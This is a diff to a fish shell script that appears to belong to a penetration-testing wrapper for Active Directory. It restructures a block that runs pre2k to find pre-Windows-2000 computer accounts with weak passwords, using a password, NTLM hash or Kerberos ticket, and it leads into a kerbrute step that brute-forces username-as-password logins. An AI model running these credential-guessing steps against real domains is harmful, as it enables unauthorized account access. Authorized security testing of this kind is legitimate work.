@@ -283,31 +283,31 @@ Examples:
         ezpz_warn "Operation timed out. Skipping."
     end
 
-    if test -s $users_tmp
-        if command -v pre2k >/dev/null 2>&1
-            ezpz_header "Searching for pre-Win2k compatible computer accounts"
-            
-            # Build pre2k auth command
-            set pre2k_cmd pre2k auth -t 100 -u "$user" -d $domain -dc-ip $target
-            
-            # Add authentication method
-            if set -q _flag_password
-                set -a pre2k_cmd -p "$_flag_password"
-            else if set -q _flag_hash
-                set -a pre2k_cmd -hashes ":$_flag_hash"
-            else if set -q _flag_kerb
-                set -a pre2k_cmd -k
-                if set -q KRB5CCNAME
-                    set -a pre2k_cmd -no-pass
-                end
+  
+    if command -v pre2k >/dev/null 2>&1
+        ezpz_header "Searching for pre-Win2k compatible computer accounts"
+        
+        # Build pre2k auth command
+        set pre2k_cmd pre2k auth -t 100 -u "$user" -d $domain -dc-ip $target
+        
+        # Add authentication method
+        if set -q _flag_password
+            set -a pre2k_cmd -p "$_flag_password"
+        else if set -q _flag_hash
+            set -a pre2k_cmd -hashes ":$_flag_hash"
+        else if set -q _flag_kerb
+            set -a pre2k_cmd -k
+            if set -q KRB5CCNAME
+                set -a pre2k_cmd -no-pass
             end
-            
-            ezpz_cmd "$pre2k_cmd"
-            $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
-        else
-            ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
         end
+        
+        ezpz_cmd "$pre2k_cmd"
+        $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
+    else
+        ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
     end
+  
 
     if command -v kerbrute >/dev/null 2>&1
         ezpz_header "Bruteforcing credentials with username as password"
